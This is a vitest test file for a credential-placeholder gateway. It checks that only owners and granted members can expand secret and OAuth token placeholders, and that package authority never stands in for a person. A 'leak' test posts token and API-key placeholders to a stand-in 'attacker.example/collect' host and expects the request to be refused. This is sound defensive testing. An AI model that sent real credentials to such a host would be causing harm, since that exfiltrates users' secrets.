/**
 * Real-boundary coverage: expandSecretPlaceholders → authorize for ambient
 * credential use. Member / outside collaborator without secret:use or
 * integration:use must not expand org placeholders; Owners and granted
 * actors may. A saved package never stands in for the person.
 */
import { DatabaseSync } from 'node:sqlite'
import {
	ownerIdFromStored,
	personIdFromStored,
} from '@kody-internal/shared/owner-person-ids.ts'
import { expect, test, vi } from 'vitest'
import { AuthorizationError } from '#worker/authorization/authorize.ts'
import { upsertGrant } from '#worker/orgs/access-writes.ts'
import { ensureOrgsTestSchema } from '#worker/orgs/orgs-test-schema.ts'
import { provisionPersonalOrg } from '#worker/orgs/provision.ts'
import { expandSecretPlaceholders } from '#mcp/fetch-gateway.ts'
import * as secretService from '#mcp/secrets/service.ts'
import * as integrationCredentials from '#worker/integrations/credentials.ts'
import * as integrationPackageAccess from '#worker/integrations/package-access.ts'
import * as integrationsRepo from '#worker/integrations/repo.ts'
import * as integrationService from '#worker/integrations/service.ts'
import { parseAuthoredPackageJson } from '#worker/package-registry/manifest.ts'
import { insertSavedPackage } from '#worker/package-registry/repo.ts'
import * as packageSource from '#worker/package-registry/source.ts'
import { deriveRequestContext } from '#worker/request-context/request-context.ts'
import { applyAllMigrations as applyRepositoryMigrations } from '#worker/test-support/apply-all-migrations.ts'
import { createTestOrgAuditWriter } from '#worker/test-support/create-audit-db.ts'
import { createD1FromSqlite } from '#worker/test-support/create-d1-from-sqlite.ts'
import { testStableUserIdFromEmail } from '#worker/test-support/stable-user-id.ts'
import { createInMemoryUserMeterEnv } from '#worker/test-support/user-meter.ts'

// These cases cover fills the owner has opted in to; enforcement of the
// opt-in itself is covered in fill-placement-enforcement.node.test.ts.
vi.mock(
	'#worker/credentials/fill-placement-opt-ins.ts',
	async (importOriginal) => ({
		...(await importOriginal<
			typeof import('#worker/credentials/fill-placement-opt-ins.ts')
		>()),
		readFillPlacementOptIn: async () => ({
			query: true,
			path: true,
			body: true,
		}),
	}),
)

const migrationsDirectory = new URL('../../migrations/', import.meta.url)

async function createOrgDb() {
	const sqlite = new DatabaseSync(':memory:')
	applyRepositoryMigrations(sqlite, migrationsDirectory)
	const db = createD1FromSqlite(sqlite)
	await ensureOrgsTestSchema(db)
	return db
}

const secretCredentialId = 'cred-secret-org-echo'
const integrationCredentialId = 'cred-integration-org-google'

function mockPackageManifest(name: string, credentials?: unknown) {
	return vi
		.spyOn(packageSource, 'loadPackageManifestBySourceId')
		.mockResolvedValue({
			source: {} as packageSource.LoadedPackageManifest['source'],
			manifest: parseAuthoredPackageJson({
				content: JSON.stringify({
					name,
					exports: { '.': './index.ts' },
					kody: { description: 'Test package.', credentials },
				}),
				mode: 'published',
			}),
		})
}

function userSecret(
	value: string,
	allowedHosts: Array<string>,
): secretService.ResolvedSecret {
	return {
		credentialId: secretCredentialId,
		found: true,
		value,
		scope: 'user',
		allowedHosts,
		allowedPackages: [],
		placement: null,
	}
}

function mockSecretForUse(secret: secretService.ResolvedSecret) {
	const { value: _value, ...found } = secret
	return vi
		.spyOn(secretService, 'findSecretForUse')
		.mockResolvedValue({ found, readValue: async () => secret })
}

test('ambient fetch placeholders require secret:use / integration:use for members and outside collaborators', async () => {
	const db = await createOrgDb()
	const ownerStableId = testStableUserIdFromEmail('owner-a@example.com')
	const ownerId = ownerIdFromStored(ownerStableId)
	const memberId = testStableUserIdFromEmail('member-b@example.com')
	const collaboratorId = testStableUserIdFromEmail('collab-c@example.com')
	const now = '2026-10-10T00:00:00.000Z'
	await provisionPersonalOrg(db, {
		stableUserId: ownerId,
		username: 'ownera',
		createdAt: now,
	})
	await provisionPersonalOrg(db, {
		stableUserId: memberId,
		username: 'memberb',
		createdAt: now,
	})
	await provisionPersonalOrg(db, {
		stableUserId: collaboratorId,
		username: 'collabc',
		createdAt: now,
	})
	await db
		.prepare(
			`INSERT INTO org_memberships (org_id, user_id, role, created_at)
			 VALUES (?, ?, 'member', ?)`,
		)
		.bind(ownerId, memberId, now)
		.run()
	const packageId = crypto.randomUUID()
	await insertSavedPackage(
		db,
		{
			id: packageId,
			user_id: ownerId,
			name: '@ownera/notes',
			kody_id: 'notes',
			description: 'notes',
			tags_json: '[]',
			search_text: null,
			source_id: `source-${packageId}`,
			has_app: 0,
			has_skills: 0,
			hidden: 0,
			is_private: 1,
			created_at: now,
			updated_at: now,
		},
		null,
		{ stamp: false },
	)
	await upsertGrant({
		db,
		orgId: ownerId,
		resourceType: 'package',
		resourceId: packageId,
		family: 'package',
		subject: { type: 'user', id: collaboratorId },
		preset: 'use',
		permissions: null,
		createdByUserId: ownerId,
		audit: createTestOrgAuditWriter(),
	})

	const userMeter = createInMemoryUserMeterEnv()
	const env = {
		APP_DB: db,
		...userMeter.env,
		COOKIE_SECRET: 'test-cookie-secret',
		SECRET_STORE_KEY: 'test-secret-store-key-32-chars-minimum',
		// Opt out of credential-resolution audit writes (#3456).
		SENTRY_ENVIRONMENT: 'test',
	} as unknown as Env

	mockSecretForUse(userSecret('org-secret-value', ['example.com']))
	vi.spyOn(
		integrationPackageAccess,
		'assertCanUseIntegration',
	).mockResolvedValue(undefined)
	vi.spyOn(
		integrationCredentials,
		'resolveIntegrationAccessToken',
	).mockResolvedValue({
		credentialId: integrationCredentialId,
		accessToken: 'oauth-access',
	})
	vi.spyOn(
		integrationCredentials,
		'findIntegrationCredentialId',
	).mockResolvedValue(integrationCredentialId)
	vi.spyOn(integrationService, 'getJoinedIntegration').mockResolvedValue({
		lane: 'user',
		app: { apiBaseUrl: 'https://example.com' },
		connection: { requiredHosts: ['example.com'] },
	} as never)

	const secretRequest = () =>
		new Request('https://example.com/api', {
			headers: { Authorization: 'Bearer {{secret:orgEcho}}' },
		})
	const integrationRequest = () =>
		new Request('https://example.com/api', {
			headers: {
				Authorization: 'Bearer {{integration-token:orgGoogle}}',
			},
		})

	const ownerRequest = deriveRequestContext({
		user: {
			userId: personIdFromStored(ownerStableId),
			username: 'ownera',
		},
		source: { kind: 'mcp-oauth' },
		orgBinding: {
			org: { id: ownerId, slug: 'ownera' },
			role: 'owner',
		},
	})
	const memberRequest = deriveRequestContext({
		user: {
			userId: personIdFromStored(memberId),
			username: 'memberb',
		},
		source: { kind: 'mcp-oauth' },
		orgBinding: {
			org: { id: ownerId, slug: 'ownera' },
			role: 'member',
		},
	})
	const collaboratorRequest = deriveRequestContext({
		user: {
			userId: personIdFromStored(collaboratorId),
			username: 'collabc',
		},
		source: { kind: 'mcp-oauth' },
		orgBinding: {
			org: { id: ownerId, slug: 'ownera' },
			role: null,
		},
	})

	const expandFor = (request: typeof ownerRequest) =>
		expandSecretPlaceholders({
			request: secretRequest(),
			props: {
				baseUrl: 'https://example.com',
				userId: ownerId,
				email: null,
				request,
				storageContext: null,
			},
			env,
		}).then(({ request: expanded }) => expanded)

	const expandIntegrationFor = (request: typeof ownerRequest) =>
		expandSecretPlaceholders({
			request: integrationRequest(),
			props: {
				baseUrl: 'https://example.com',
				userId: ownerId,
				email: null,
				request,
				storageContext: null,
			},
			env,
		}).then(({ request: expanded }) => expanded)

	// Owner A: ambient placeholders resolve.
	const ownerSecret = await expandFor(ownerRequest)
	expect(ownerSecret.headers.get('Authorization')).toBe(
		'Bearer org-secret-value',
	)
	const ownerIntegration = await expandIntegrationFor(ownerRequest)
	expect(ownerIntegration.headers.get('Authorization')).toBe(
		'Bearer oauth-access',
	)

	// Member B (no grants): denied with the missing permission named.
	const memberSecretError = await expandFor(memberRequest).then(
		() => null,
		(caught: unknown) => caught,
	)
	expect(memberSecretError).toBeInstanceOf(AuthorizationError)
	expect(memberSecretError).toMatchObject({
		code: 'missing_permission',
		permission: 'secret:use',
		resource: expect.objectContaining({
			type: 'credential',
			id: secretCredentialId,
			label: 'orgEcho',
		}),
	})
	expect(String(memberSecretError)).toMatch(/Missing secret:use/)

	const memberIntegrationError = await expandIntegrationFor(memberRequest).then(
		() => null,
		(caught: unknown) => caught,
	)
	expect(memberIntegrationError).toBeInstanceOf(AuthorizationError)
	expect(memberIntegrationError).toMatchObject({
		code: 'missing_permission',
		permission: 'integration:use',
		resource: expect.objectContaining({
			type: 'credential',
			id: integrationCredentialId,
			label: 'orgGoogle',
		}),
	})
	expect(String(memberIntegrationError)).toMatch(/Missing integration:use/)

	// Outside collaborator C (package Use only): same denials.
	const collabSecretError = await expandFor(collaboratorRequest).then(
		() => null,
		(caught: unknown) => caught,
	)
	expect(collabSecretError).toBeInstanceOf(AuthorizationError)
	expect(collabSecretError).toMatchObject({
		code: 'missing_permission',
		permission: 'secret:use',
	})
	const collabIntegrationError = await expandIntegrationFor(
		collaboratorRequest,
	).then(
		() => null,
		(caught: unknown) => caught,
	)
	expect(collabIntegrationError).toBeInstanceOf(AuthorizationError)
	expect(collabIntegrationError).toMatchObject({
		code: 'missing_permission',
		permission: 'integration:use',
	})

	// Grant Use on those credential ids → member may use.
	// Fresh request contexts: effective permissions are cached per request
	// object, so reusing the pre-grant memberRequest would keep the denial.
	await upsertGrant({
		db,
		orgId: ownerId,
		resourceType: 'credential',
		resourceId: secretCredentialId,
		family: 'secret',
		subject: { type: 'user', id: memberId },
		preset: 'use',
		permissions: null,
		createdByUserId: ownerId,
		audit: createTestOrgAuditWriter(),
	})
	await upsertGrant({
		db,
		orgId: ownerId,
		resourceType: 'credential',
		resourceId: integrationCredentialId,
		family: 'integration',
		subject: { type: 'user', id: memberId },
		preset: 'use',
		permissions: null,
		createdByUserId: ownerId,
		audit: createTestOrgAuditWriter(),
	})
	const memberAfterGrant = deriveRequestContext({
		user: {
			userId: personIdFromStored(memberId),
			username: 'memberb',
		},
		source: { kind: 'mcp-oauth' },
		orgBinding: {
			org: { id: ownerId, slug: 'ownera' },
			role: 'member',
		},
	})
	const grantedSecret = await expandFor(memberAfterGrant)
	expect(grantedSecret.headers.get('Authorization')).toBe(
		'Bearer org-secret-value',
	)
	const grantedIntegration = await expandIntegrationFor(memberAfterGrant)
	expect(grantedIntegration.headers.get('Authorization')).toBe(
		'Bearer oauth-access',
	)

	// Package authority never stands in for the person: collaborator C has no
	// secret grant, so a saved package they run is denied the secret too.
	mockSecretForUse(userSecret('pkg-secret-value', ['example.com']))
	mockPackageManifest('@ownera/notes')
	const packageAuthoritySecret = expandSecretPlaceholders({
		request: secretRequest(),
		props: {
			baseUrl: 'https://example.com',
			userId: ownerId,
			email: null,
			request: collaboratorRequest,
			storageContext: {
				sessionId: null,
				appId: packageId,
				packageId,
				storageId: packageId,
			},
			// Bundled package runs pass provenance grants; omit → empty set
			// still keeps runPackageId as authority when no stamp header.
			grantedSecretAuthorityPackageIds: [packageId],
		},
		env,
	})
	await expect(packageAuthoritySecret).rejects.toMatchObject({
		name: 'AuthorizationError',
		code: 'missing_permission',
		permission: 'secret:use',
	})
})

async function setupDeclaredPackage(input: {
	username: string
	packageName: string
}) {
	const db = await createOrgDb()
	const ownerStableId = testStableUserIdFromEmail(
		`${input.username}@example.com`,
	)
	const ownerId = ownerIdFromStored(ownerStableId)
	const now = '2026-10-11T00:00:00.000Z'
	await provisionPersonalOrg(db, {
		stableUserId: ownerId,
		username: input.username,
		createdAt: now,
	})
	const packageId = crypto.randomUUID()
	await insertSavedPackage(
		db,
		{
			id: packageId,
			user_id: ownerId,
			name: input.packageName,
			kody_id: input.packageName.split('/')[1]!,
			description: 'test package',
			tags_json: '[]',
			search_text: null,
			source_id: `source-${packageId}`,
			has_app: 0,
			has_skills: 0,
			hidden: 0,
			is_private: 1,
			created_at: now,
			updated_at: now,
		},
		null,
		{ stamp: false },
	)
	const ownerRequest = deriveRequestContext({
		user: {
			userId: personIdFromStored(ownerStableId),
			username: input.username,
		},
		source: { kind: 'mcp-oauth' },
		orgBinding: {
			org: { id: ownerId, slug: input.username },
			role: 'owner',
		},
	})
	const env = {
		APP_DB: db,
		...createInMemoryUserMeterEnv().env,
		COOKIE_SECRET: 'test-cookie-secret',
		SECRET_STORE_KEY: 'test-secret-store-key-32-chars-minimum',
		// Opt out of credential-resolution audit writes (#3456).
		SENTRY_ENVIRONMENT: 'test',
	} as unknown as Env
	const expandAsPackage = async (url: string, init: RequestInit = {}) => {
		const { request: expanded, bodyFillDone } = await expandSecretPlaceholders({
			request: new Request(url, init),
			props: {
				baseUrl: 'https://example.com',
				userId: ownerId,
				email: null,
				request: ownerRequest,
				storageContext: {
					sessionId: null,
					appId: packageId,
					packageId,
					storageId: packageId,
				},
				grantedSecretAuthorityPackageIds: [packageId],
			},
			env,
		})
		// Body placeholders resolve while the body streams. Drain a clone so
		// placement / host-denial errors surface here while the returned
		// Request still has a readable body for assertions.
		if (expanded.body) {
			const peeked = expanded.clone()
			try {
				await peeked.arrayBuffer()
				await bodyFillDone
			} catch (error) {
				await bodyFillDone.catch(() => {})
				throw error
			}
		} else {
			await bodyFillDone
		}
		return expanded
	}
	return { expandAsPackage }
}

test('leak: a declared package fills its credentials anywhere on an allowed host over HTTPS, and is refused elsewhere before they resolve', async () => {
	mockPackageManifest('@ownerp/mailer', {
		RESEND_API_KEY: {
			kind: 'secret',
			provider: 'resend',
			description: 'Resend API key.',
		},
		GOOGLE: { kind: 'oauth', provider: 'google', description: 'Google.' },
	})
	const resolveSpy = mockSecretForUse(
		userSecret('resend-secret-value', ['api.resend.com']),
	)
	const tokenSpy = vi
		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
		.mockResolvedValue({
			credentialId: integrationCredentialId,
			accessToken: 'google-access',
		})
	vi.spyOn(
		integrationPackageAccess,
		'assertCanUseIntegration',
	).mockResolvedValue(undefined)
	vi.spyOn(integrationService, 'getJoinedIntegration').mockResolvedValue({
		lane: 'user',
		app: { apiBaseUrl: 'https://api.resend.com' },
		connection: { requiredHosts: ['api.resend.com'] },
	} as never)
	// A legacy connection (no placement) whose owner opted in to every part.
	vi.spyOn(
		integrationCredentials,
		'findIntegrationCredentialId',
	).mockResolvedValue(integrationCredentialId)
	vi.spyOn(integrationsRepo, 'getIntegrationFillPlacement').mockResolvedValue(
		null,
	)
	const { expandAsPackage } = await setupDeclaredPackage({
		username: 'ownerp',
		packageName: '@ownerp/mailer',
	})

	const header = await expandAsPackage('https://api.resend.com/emails', {
		headers: { 'X-Api-Key': '{{secret:RESEND_API_KEY}}' },
	})
	expect(header.headers.get('X-Api-Key')).toBe('resend-secret-value')
	const query = await expandAsPackage(
		'https://api.resend.com/emails?key={{secret:RESEND_API_KEY}}',
	)
	expect(new URL(query.url).searchParams.get('key')).toBe('resend-secret-value')
	const body = await expandAsPackage('https://api.resend.com/oauth/token', {
		method: 'POST',
		headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
		body: 'grant_type=x&access_token={{integration-token:GOOGLE}}',
	})
	expect(await body.text()).toBe('grant_type=x&access_token=google-access')
	resolveSpy.mockClear()
	tokenSpy.mockClear()

	await expect(
		expandAsPackage('http://api.resend.com/emails', {
			method: 'POST',
			body: JSON.stringify({ key: '{{secret:RESEND_API_KEY}}' }),
		}),
	).rejects.toMatchObject({
		code: 'credential_placement_refused',
		slot: 'RESEND_API_KEY',
		message: expect.stringContaining(
			'Secret "RESEND_API_KEY" cannot be sent to host "api.resend.com" over plain HTTP.',
		),
	})
	expect(resolveSpy).not.toHaveBeenCalled()

	await expect(
		expandAsPackage('https://attacker.example/collect', {
			method: 'POST',
			body: 'token={{integration-token:GOOGLE}}',
		}),
	).rejects.toMatchObject({
		code: 'credential_placement_refused',
		slot: 'GOOGLE',
		message: expect.stringContaining('"attacker.example"'),
	})
	await expect(
		expandAsPackage('https://attacker.example/collect', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ key: '{{secret:RESEND_API_KEY}}' }),
		}),
	).rejects.toMatchObject({
		code: 'credential_placement_refused',
		slot: 'RESEND_API_KEY',
		message: expect.stringContaining('attacker.example'),
	})
	expect(tokenSpy).not.toHaveBeenCalled()
})
